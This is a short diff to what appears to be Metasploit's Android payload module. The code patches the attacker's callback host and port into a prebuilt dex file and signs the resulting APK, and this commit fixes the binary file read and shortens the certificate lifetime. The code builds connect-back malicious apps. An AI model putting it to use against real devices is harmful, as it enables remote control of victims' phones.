@@ -35,7 +35,7 @@ module Metasploit3
 	def generate_jar(opts={})
 		jar = Rex::Zip::Jar.new
 
-		classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'))
+		classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
 
 		string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
 		string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
@@ -74,7 +74,7 @@ module Metasploit3
 		# requirement. You can not upload an application if it is signed
 		# with a key whose validity expires before that date.
 		# """
-		cert.not_after = cert.not_before + 3600*24*365*30 # 30 years
+		cert.not_after = cert.not_before + 3600*24*365*20 # 20 years
 
 		jar.sign(key, cert, [cert])
 
